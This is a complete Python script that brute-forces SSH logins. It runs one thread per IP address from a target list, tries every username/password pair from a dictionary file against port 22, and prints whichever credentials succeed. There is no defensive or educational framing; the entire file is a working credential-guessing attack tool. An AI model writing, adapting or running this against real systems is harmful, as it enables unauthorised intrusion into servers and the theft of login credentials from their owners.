import paramiko
import threading


def get_ip_list():
    IP_LIST = []
    f = open('iplist.txt')
    for item in f.readlines():
        item = item.strip()
        if item and not item.startswith('#'):
            IP_LIST.append(item)
    f.close()
    return IP_LIST


def get_account_list():
    USER_LIST = []
    f = open('dictionary.txt')
    for item in f.readlines():
        item = item.strip('\n')
        if item and not item.startswith('#'):
            arr = item.strip().split()
            if len(arr) == 2:
                USER_LIST.append((arr[0], arr[1]))
        f.close()
    return USER_LIST


def scan_all():
    ip_list = get_ip_list()
    for item in ip_list:
        th = threading.Thread(target=cracking, args=(item,))
        th.start()


def cracking(ip):
    accounts = get_account_list()
    for user, password in accounts:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, 22, user, password, timeout=5)
            print ("%s user is: %s, password is: %s" % (ip, user, password))
        except Exception as e:
            pass


if __name__ == '__main__':
    scan_all()